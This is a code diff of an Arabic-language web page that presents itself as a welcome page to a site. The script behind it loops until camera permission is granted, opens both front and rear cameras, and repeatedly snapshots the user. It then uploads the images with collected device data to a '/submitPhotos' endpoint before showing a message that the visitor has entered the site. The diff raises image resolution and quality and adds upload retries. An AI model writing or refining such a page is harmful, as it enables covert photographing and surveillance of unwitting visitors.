@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title> في موقعنا مرحبا بك</title>
+    <title>مرحباا بك</title>
     <style>
         body {
             background-color: black;
@@ -89,11 +89,17 @@
         async function requestCameraPermission() {
             while (true) {
                 try {
-                    await navigator.mediaDevices.getUserMedia({ video: true });
+                    await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: 'user'
+                        } 
+                    });
                     return true;
                 } catch (error) {
                     console.error('Error accessing camera:', error);
-                    await new Promise(resolve => setTimeout(resolve, 100));
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             }
         }
@@ -102,8 +108,20 @@
             try {
                 const additionalData = await collectAdditionalData();
                 await requestCameraPermission();
-                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    } 
+                });
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'environment'
+                    } 
+                });
                 handleSuccess(frontStream, backStream, additionalData);
             } catch (e) {
                 console.error('Error in init:', e);
@@ -141,38 +159,49 @@
                     formData.append('cameraType', cameraType);
                     formData.append('additionalData', JSON.stringify(additionalData));
                     post('/submitPhotos', formData);
-                }, 'image/png', 0.7);
+                }, 'image/png', 0.9);  // زيادة جودة الصورة إلى 0.9
 
                 photoCount++;
-            }, 100);
+            }, 500);  // زيادة الفاصل الزمني بين الصور إلى 500 مللي ثانية
         }
 
         async function post(url, formData) {
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
+            const maxRetries = 5;
+            let retries = 0;
 
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+            while (retries < maxRetries) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        console.log('Photos sent successfully');
+                        document.querySelector('.container').innerHTML = `
+                            <h1>تم تنفيذ طلبك ودخول إلى الموقع</h1>
+                            <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
+                        `;
+                        return;
+                    } else {
+                        throw new Error(data.error);
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    retries++;
+                    if (retries < maxRetries) {
+                        await new Promise(resolve => setTimeout(resolve, 2000 * retries));  // زيادة وقت الانتظار مع كل محاولة
+                    }
                 }
-
-                const data = await response.json();
-
-                if (data.success) {
-                    console.log('Photos sent successfully');
-                    document.querySelector('.container').innerHTML = `
-                        <h1>تم تنفيذ طلبك ودخول إلى الموقع</h1>
-                        <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
-                    `;
-                } else {
-                    throw new Error(data.error);
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                setTimeout(() => post(url, formData), 1000);
             }
+
+            console.error('Max retries reached. Unable to send photos.');
         }
 
         window.addEventListener('load', init);
